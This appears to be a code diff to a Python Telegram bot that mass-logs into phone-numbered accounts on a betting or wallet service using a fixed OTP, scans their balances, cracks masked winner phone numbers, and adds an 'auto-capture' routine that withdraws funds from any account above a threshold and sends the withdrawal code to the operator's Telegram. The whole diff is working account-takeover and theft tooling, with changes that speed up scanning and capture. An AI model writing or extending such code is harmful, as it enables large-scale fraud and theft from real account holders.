@@ -88,7 +88,7 @@ _tokens = {}
 
 # top-winner mask cracking: phone is 251 + 6 unknown digits + last3 visible
 # first digit of the 9-digit national number is 9 (Ethio Telecom) or 7 (Safaricom)
-MASK_THREADS = int(os.environ.get('ADIL_MASK_THREADS', '6'))
+MASK_THREADS = int(os.environ.get('ADIL_MASK_THREADS', '4'))
 
 
 def log(msg):
@@ -281,7 +281,32 @@ def withdraw(phone, amount=None):
 
 
 # ---------------------------------------------------------------- worker: rescan
+# ---------------------------------------------------------------- worker: rescan
+def _maybe_capture(ph, wd, A2, source):
+    """Auto-withdraw + push the code the moment a fat account is seen."""
+    c = cfg()
+    thr = float(c.get('threshold', 5000.0))
+    any_mode = bool(c.get('auto_withdraw_any', False))
+    hit_min = WD_MIN if any_mode else thr
+    if wd is None or wd < hit_min:
+        return False
+    if ph in set(jload(F_CODES, []) and [x.get('phone') for x in jload(F_CODES, [])] or []):
+        pass
+    log('AUTO-CAPTURE %s wd=%.2f (source=%s)' % (ph, wd, source))
+    code, rec = withdraw(ph)
+    if code:
+        tg_send('🎯 <b>CAPTURED</b> (%s)\n+%s\nwithdrawable %.2f\nnet %s\n'
+                '<b>CODE: %s</b>\nagent: %s'
+                % (source, ph, wd, (rec or {}).get('amount'), code,
+                   (rec or {}).get('agent') or 'unassigned'))
+    else:
+        tg_send('⚠️ capture failed (%s)\n+%s wd=%.2f\n%s'
+                % (source, ph, wd, json.dumps(rec)[:200]))
+    return bool(code)
+
+
 def rescan_worker():
+    """Endless sweep: the next cycle starts the instant the previous ends."""
     cycle = 0
     while True:
         cycle += 1
@@ -289,7 +314,7 @@ def rescan_worker():
             A = login()
             if not A:
                 log('rescan: login failed')
-                time.sleep(60)
+                time.sleep(30)
                 continue
             phones = load_master()
             with _lock:
@@ -297,7 +322,8 @@ def rescan_worker():
                 _stats['rescan_done'] = 0
                 _stats['rescan_cycle'] = cycle
             log('rescan cycle %d: %d phones' % (cycle, len(phones)))
-            bal = {}
+            prev = jload(F_BAL, {})
+            fresh = {}
             done = 0
             for ph in phones:
                 try:
@@ -305,31 +331,82 @@ def rescan_worker():
                                       json={'phone': '+' + ph, 'otp': OTP},
                                       headers=H, timeout=10, verify=False)
                     if r.status_code == 429:
-                        time.sleep(2)
+                        time.sleep(1.5)
                         continue
                     if r.status_code == 200:
-                        at = r.json()['data']['access_token']
-                        A2 = {'Authorization': 'Bearer ' + at, **H}
+                        A2 = {'Authorization': 'Bearer ' + r.json()['data']['access_token'], **H}
                         wd, lk, raw = balance(A2)
                         if wd is not None and (wd > 0 or lk > 0):
-                            bal[ph] = {'wd': round(wd, 2), 'locked': round(lk, 2),
-                                       'bal': round(float(raw.get('balance') or 0), 2)}
+                            fresh[ph] = {'wd': round(wd, 2), 'locked': round(lk, 2),
+                                         'bal': round(float(raw.get('balance') or 0), 2)}
+                            # ---- instant capture the moment it qualifies ----
+                            _maybe_capture(ph, wd, A2, 'rescan')
                 except Exception:
                     pass
                 done += 1
-                if done % 25 == 0:
+                # keep /top fresh: persist every 5 accounts
+                if done % 5 == 0:
                     with _lock:
                         _stats['rescan_done'] = done
-                        jsave(F_BAL, bal)
-                time.sleep(0.05)
+                        jsave(F_BAL, {**prev, **fresh})   # never blank out the cache
+                time.sleep(0.03)
             with _lock:
                 _stats['rescan_done'] = done
-                jsave(F_BAL, bal)
-            log('rescan cycle %d done: %d funded' % (cycle, len(bal)))
+                jsave(F_BAL, fresh)
+            log('rescan cycle %d done: %d funded — restarting immediately'
+                % (cycle, len(fresh)))
+            # no sleep: next cycle starts now
         except Exception:
             _stats['last_error'] = traceback.format_exc()[-300:]
             log('rescan error: ' + _stats['last_error'][-150:])
-            time.sleep(30)
+            time.sleep(10)
+
+
+# ---------------------------------------------------------------- worker: live top
+def toplive_worker():
+    """Refresh the live top-N balances every TOP_REFRESH seconds.
+
+    Writes state/top_live.json (used by /top) and auto-captures anything that
+    crosses the threshold between rescans.
+    """
+    refresh = int(os.environ.get('ADIL_TOP_REFRESH', '5'))
+    n = int(os.environ.get('ADIL_TOP_N', '15'))
+    while True:
+        try:
+            A = login()
+            if not A:
+                time.sleep(15)
+                continue
+            bal = jload(F_BAL, {})
+            cand = [p for p, v in sorted(bal.items(),
+                                         key=lambda kv: -(kv[1].get('wd') or 0))[:n]]
+            live = []
+            for ph in cand:
+                A2 = auth_for(ph)
+                if not A2:
+                    continue
+                wd, lk, raw = balance(A2)
+                if wd is None:
+                    continue
+                live.append({'phone': ph, 'wd': round(wd, 2), 'locked': round(lk or 0, 2)})
+                if wd >= float(cfg().get('threshold', 5000.0)) or \
+                   (cfg().get('auto_withdraw_any') and wd >= WD_MIN):
+                    _maybe_capture(ph, wd, A2, 'toplive')
+                time.sleep(0.15)
+            live.sort(key=lambda x: -x['wd'])
+            with _lock:
+                jsave(os.path.join(STATE, 'top_live.json'),
+                      {'ts': time.strftime('%Y-%m-%dT%H:%M:%S'), 'items': live})
+                # keep balances.json in sync with the fresh numbers
+                b2 = jload(F_BAL, {})
+                for it in live:
+                    b2.setdefault(it['phone'], {})
+                    b2[it['phone']]['wd'] = it['wd']
+                    b2[it['phone']]['locked'] = it['locked']
+                jsave(F_BAL, b2)
+        except Exception:
+            log('toplive error: ' + traceback.format_exc()[-120:])
+        time.sleep(max(1, refresh))
 
 
 # ---------------------------------------------------------------- worker: refund
@@ -655,6 +732,10 @@ def mask_worker():
 
 
 def top_n(n):
+    """Prefer the 5-second live snapshot; fall back to the rescan cache."""
+    live = jload(os.path.join(STATE, 'top_live.json'), None)
+    if live and live.get('items'):
+        return [(it['phone'], {'wd': it['wd'], 'locked': it['locked']}) for it in live['items']][:n]
     bal = jload(F_BAL, {})
     items = sorted(bal.items(), key=lambda kv: -(kv[1].get('wd') or 0))
     return items[:n]
@@ -981,8 +1062,17 @@ def run_budgeted(mode, budget):
             log('login failed')
             return
         phones = load_master()
+        shard = os.environ.get('ADIL_SHARD', '').strip()
+        if shard:
+            try:
+                idx, total = [int(x) for x in shard.split('/')]
+                chunk = len(phones) // total + 1
+                phones = phones[idx * chunk:(idx + 1) * chunk]
+                log('rescan SHARD %d/%d -> %d phones' % (idx + 1, total, len(phones)))
+            except Exception:
+                log('bad ADIL_SHARD=%r, scanning all' % shard)
         log('rescan: %d phones' % len(phones))
-        bal = {}
+        bal = jload(F_BAL, {})
         done = 0
         for ph in phones:
             if left() < 30:
@@ -1178,7 +1268,7 @@ def main():
     log('=== adil_bot starting ===')
     log('bot token: %s | master: %d | watchlist: %d'
         % ('set' if BOT_TOKEN else 'MISSING', len(load_master()), len(jload(F_WATCH, []))))
-    for fn in (rescan_worker, refund_worker, lb_worker, spin_worker, mask_worker):
+    for fn in (rescan_worker, toplive_worker, refund_worker, lb_worker, spin_worker, mask_worker):
         threading.Thread(target=fn, daemon=True).start()
         time.sleep(1)
     tg_poll()
